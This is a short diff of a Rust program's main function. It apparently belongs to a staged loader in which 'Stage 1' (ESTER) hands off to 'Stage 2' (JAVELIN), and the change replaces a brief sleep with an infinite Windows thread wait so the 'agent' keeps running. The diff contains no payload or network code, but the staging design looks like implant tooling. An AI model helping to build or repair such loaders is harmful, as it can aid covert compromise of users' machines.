@@ -72,12 +72,25 @@ fn main() {
     // This is where we hand off control to the next stage
     debug_print!("[ESTER] Triggering Stage 2 (JAVELIN)...");
     match stage_trigger::trigger_javelin() {
-        Ok(_) => {
+        Ok(thread_handle) => {
             debug_print!("[ESTER] Stage 2 triggered successfully");
             
-            // Give JAVELIN a moment to initialize before we exit
-            // This ensures the thread has time to start executing
-            thread::sleep(Duration::from_millis(500));
+            // CRITICAL: We must wait for the JAVELIN thread to complete
+            // If ESTER exits, the thread dies with it!
+            // In production mode, wait indefinitely for JAVELIN to finish
+            // (which means waiting for the entire agent lifecycle)
+            #[cfg(target_os = "windows")]
+            {
+                use winapi::um::synchapi::WaitForSingleObject;
+                use winapi::um::winbase::INFINITE;
+                
+                if !thread_handle.is_null() {
+                    debug_print!("[ESTER] Waiting for JAVELIN thread to complete...");
+                    unsafe {
+                        WaitForSingleObject(thread_handle, INFINITE);
+                    }
+                }
+            }
         }
         Err(e) => {
             debug_print!("[ESTER] Failed to trigger Stage 2: {:?}", e);
@@ -87,7 +100,7 @@ fn main() {
         }
     }
 
-    debug_print!("[ESTER] Stage 1 complete - exiting to allow JAVELIN to continue");
+    debug_print!("[ESTER] Stage 1 complete");
     
     // In dev mode, wait for user input so we can see the output
     #[cfg(feature = "dev")]
